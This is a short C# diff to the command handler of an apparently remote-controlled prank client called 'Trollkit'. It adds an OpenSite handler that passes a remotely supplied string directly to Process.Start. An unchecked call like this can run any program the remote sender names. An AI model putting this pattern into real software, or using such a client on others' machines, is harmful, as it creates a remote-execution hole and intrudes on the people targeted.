@@ -30,6 +30,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 					ShowImage(obj.Value);
 					break;
 				case "OpenSite":
+					OpenSite(obj.Value);
 					break;
 				case "SetBackground":
 					break;
@@ -64,7 +65,6 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			string path = Environment.GetFolderPath(
 				Environment.SpecialFolder.ProgramFiles);
 
-			// create our startup process and argument
 			var psi = new ProcessStartInfo(
 				"rundll32.exe",
 				String.Format(
@@ -80,13 +80,17 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			psi.UseShellExecute = false;
 
 			var viewer = Process.Start(psi);
-			// cleanup when done...
 			viewer.EnableRaisingEvents = true;
 			viewer.Exited += (o, args) =>
 			{
 				File.Delete(tempFileName);
 			};
 
+		}
+
+		private void OpenSite(string url)
+		{
+			Process.Start(url);
 		}
 	}
 }
